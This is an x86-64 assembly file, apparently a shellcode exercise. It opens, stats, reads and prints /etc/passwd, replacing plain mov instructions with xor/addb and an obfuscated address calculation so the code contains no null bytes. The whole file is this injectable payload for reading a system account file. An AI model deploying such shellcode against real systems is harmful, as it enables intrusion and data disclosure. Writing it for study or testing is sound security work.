# program needs to open file, make buf of right size, read data, write to stdout, exit
        .global _start

        .text
_start:
	# syscall to open
	xor %rax, %rax
	addb $2, %al
	#mov 	$2, %rax		# system call num 2 is open
        lea 0x01111129(%rip), %rdi
        sub $0x11110c5, %rdi
	#mov	$path_to_passwd, %rdi
	xor %rsi, %rsi
	#mov	$0, %rsi		# $0 is O_RDONLY according to fcntl.h
	xor %rdx, %rdx
	#mov	$0, %rdx		# mode shouldn't matter anyway (no new file)
	syscall 			# invoke os to do execute the syscall

	push %rax
	pop %r8
	#mov %rax, %r8			# save fd of file in temp register r8
	sub $120, %rsp 			# allocate memory for statbuf (8 * 15)

	# find size of file using fstat
	xor %rax, %rax
	addb $4, %al
	#mov $4, %rax			# system call num 4 is stat
	lea 0x01111129(%rip), %rdi
        sub $0x11110e7, %rdi
	#mov $path_to_passwd, %rdi
	push %rsp
	pop %rsi
	#mov %rsp, %rsi			# stat outputs file info in buffer
	syscall

	#TODO - convert thi after checking other changes r ok
	#allocate appropriate amount of memory using resulting statbuf
	add $48, %rsp			# move to filesize in statbuf (8*6)
	pop %r9				# pop size of file to temp register (adds by 4)
	add $68, %rsp			# free statbuf memory
	sub %r9, %rsp			# allocate filesize amount of memory for read/write to use


	# syscall to read
	push %r8
	pop %rdi
	#mov %r8, %rdi			# return of open is fd of read
	xor %rax, %rax
	#mov $0, %rax 			# system call num  0 is read
	push %rsp
	pop %rsi
	#mov %rsp, %rsi 			# allocated space in buffer passed in to write to
	push %r9
	pop %rdx
	#mov %r9, %rdx			# read entire buffer
	syscall

	# syscall to write
	xor %rax, %rax
	inc %rax
	#mov	$1, %rax 		# system call num 1 is write
	xor %rdi, %rdi
	inc %rdi
	#mov	$1, %rdi 		# file descriptor 1 is stdout
	push %rsp
	pop %rsi
	#mov 	%rsp, %rsi		# writing from earlier allocated buffer
	push %r9
	pop %rdx
	#mov	%r9, %rdx		# write to whole buffer
	syscall

        # exit(0)
        xor %rax, %rax
        addb $60, %al                   # system call 60 is exit
        xor %rdi, %rdi                  # we want return code 0
        syscall                         # invoke operating system to exit
path_to_passwd:
        .ascii  "/etc/passwd"
